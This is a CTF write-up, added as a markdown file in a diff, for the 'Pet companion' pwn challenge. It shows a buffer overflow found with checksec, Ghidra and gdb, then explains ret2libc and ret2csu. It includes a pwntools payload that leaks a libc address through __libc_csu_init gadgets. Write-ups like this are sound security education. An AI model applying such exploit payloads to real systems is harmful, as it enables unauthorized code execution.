@@ -1,0 +1,168 @@
+---
+title: "Cyber Apocalypse CTF 2024: Pet companion"
+description: "Pwn Pet Companion writeup for Cyber Apocalypse CTF 2024"
+date: 2024-03-15
+tags: ['pwn', 'ret2csu']
+image: './cyber-apocalypse-ctf-2024.jpg'
+authors: ['p4rr4']
+---
+
+
+## Basic analysis
+
+We are working with a 64-bit binary, dynamically linked, and we are also given the loader and `libc` used in the remote server. Let's check its protections using `checksec`:
+
+```javascript
+Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+``` 
+
+## Interaction
+
+When interacting with the binary, it shows us a prompt to enter our input:
+
+```bash
+❯ ./pet_companion
+
+[!] Set your pet companion's current status: good
+
+[*] Configuring...
+```
+
+Let's try to overflow the buffer:
+
+```bash
+❯ ./pet_companion
+
+[!] Set your pet companion's current status: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+[*] Configuring...
+
+[1]    21100 segmentation fault (core dumped)  ./pet_companion
+```
+
+Good news, we have a buffer overflow. Now, we open it up with `ghidra` to have a closer look.
+
+## Disassembly
+
+The only interesting function is the `main` one:
+
+```c
+undefined8 main(void)
+{
+  undefined8 local_48;
+  undefined8 local_40;
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined8 local_28;
+  undefined8 local_20;
+  undefined8 local_18;
+  undefined8 local_10;
+  
+  setup();
+  local_48 = 0;
+  local_40 = 0;
+  local_38 = 0;
+  local_30 = 0;
+  local_28 = 0;
+  local_20 = 0;
+  local_18 = 0;
+  local_10 = 0;
+  write(1,"\n[!] Set your pet companion\'s current status: ",0x2e);
+  read(0,&local_48,0x100);
+  write(1,"\n[*] Configuring...\n\n",0x15);
+  return 0;
+}
+```
+
+As we can see, it initialises the buffer, and then takes 0x100 bytes (256 in decimal) from our input into the buffer, leading to the overflow.
+
+## Exploitation
+
+Thanks to the buffer overflow, we have the power to hijack the execution flow of the program in order to return to the address that we want. However, we don't have any `win` function and shellcode can't be injected into the stack and executed due to the NX bit. Despite that, we have the `write` function loaded into the binary, which gives us the possibility to perform a `ret2libc` attack. 
+
+As we said before, this binary is dynamically linked, which means that it imports the functions from its libraries during runtime, rather than incorporating them directly into the binary itself when it is compiled. This process is done through both the [Global Offset Table (GOT) and Procedure Linkage Table (PLT)](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got). The GOT stores entries which contain the addresses of library functions loaded at runtime (this is done by the loader), while the PLT contains a series of stubs that redirect function calls to the appropriate shared library functions. We can easily see how this works at a low level using `gdb`:
+
+```javascript
+→   0x4006a8 <main+94>        call   0x4004f0 <write@plt>
+   ↳    0x4004f0 <write@plt+0>    jmp    QWORD PTR [rip+0x200ae2]   # 0x600fd8 <write@got.plt>
+```
+
+When setting a breakpoint just before the call to `write` inside the `main` function, we can see how it first calls the PLT address of `write`, which will then jump to the GOT entry containing the `libc` address for `write`. 
+
+### ret2libc?
+
+Ret-to-libc is an attack based on using the functions and resources already loaded in the `libc`, such as the `system` function and `/bin/sh` string, to exploit the program.
+
+The goal in our case would be to load the `/bin/sh` string as first parameter and the make a call to `system` to spawn a shell. However, we don't know the addresses of these two, as they are loaded at runtime and randomised due to [ASLR](https://www.techtarget.com/searchsecurity/definition/address-space-layout-randomization-ASLR), so we have to find a way to leak these addresses at runtime. Here is when functions such as `puts` or `write` come into play.
+
+As `write` is already loaded in the PLT section we saw before, we can call it and pass the GOT address of `write` as parameter in order to leak it. From here, we can leak the addresses of other functions in order to find the `libc` the binary is using and finally calculate the offset of `system` and `/bin/sh` with websites like [this](https://libc.blukat.me/). The [`write`](https://www.man7.org/linux/man-pages/man2/write.2.html) function takes three parameters, which means that we will have to find gadgets to control `rdi`, `rsi` and `rdx`. Sadly, we won't find such gadgets :(
+
+### ret2csu
+
+When we find ourselves lacking gadgets to complete our exploit, we can use a series of functions that allow the dynamic linking of the binary. In this case, we will focus on `__libc_csu_init`, which contains the following two gadgets:
+ 
+```javascript
+0x000000000040073a <+90>:	pop    rbx
+0x000000000040073b <+91>:	pop    rbp
+0x000000000040073c <+92>:	pop    r12
+0x000000000040073e <+94>:	pop    r13
+0x0000000000400740 <+96>:	pop    r14
+0x0000000000400742 <+98>:	pop    r15
+0x0000000000400744 <+100>:	ret 
+```
+
+```javascript
+0x0000000000400720 <+64>:	mov    rdx,r15
+0x0000000000400723 <+67>:	mov    rsi,r14
+0x0000000000400726 <+70>:	mov    edi,r13d
+0x0000000000400729 <+73>:	call   QWORD PTR [r12+rbx*8]
+*SNIP*
+0x000000000040072d <+77>:	add    rbx,0x1
+0x0000000000400731 <+81>:	cmp    rbp,rbx // !! rbp = rbx = 1
+```
+
+As we can see, we can control `r13`, `r14` and `r15`, which will respectively go into `rdi`, `rsi` and `rdx`. Finally, it will call the funciton calculated in `[r12+rbx*8]`. If we put 0 in `rbx` and 1 in `rbp`, we will pass the comparison and successfully jump to `r12`. With this, we have enough to perform the attack.
+
+### Attack
+
+Firstly, we have to find the offset at which we start overwriting the return address, using `gdb`:
+
+```bash
+gef➤  pattern create 100
+[+] Generating a pattern of 100 bytes (n=8)
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+[+] Saved as '$_gef0'
+gef➤  r
+Starting program: pet_companion 
+
+[!] Set your pet companion\'s current status: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+*SNIP*
+gef➤  pattern search $rsp
+[+] Searching for '6a61616161616161'/'616161616161616a' with period=8
+[+] Found at offset 72 (little-endian search) likely
+```
+
+Now we know that we must start our payload with 72 bytes of padding until we reach the return address. The following step is to leak the address using the gadgets stated above:
+
+```python
+gadget_1 = 0x000000000040073a
+gadget_2 = 0x0000000000400720
+
+payload = b''
+payload += b'a'*72
+
+payload += p64(gadget_1)
+payload += p64(0) #rbx
+payload += p64(1) #rbp
+payload += p64(exe.got.write) #r12
+payload += p64(1) + p64(exe.got.write) + p64(8) # r13, r14, r15 -> rdi, rsi, rdx
+payload += p64(gadget_2)
+payload += p64(0) * 7 #padding
+payload += p64(exe.sym.main) # return to main
+```
+
+Finally, calculate the offset of `system` and `/bin/sh` and craft the final payload to spawn the shell! (Full exploit can be found [here](https://github.com/p4rr4/ctf-writeups/blob/main/cyber-apocallypse-2024/pet-companion/xpl.py))
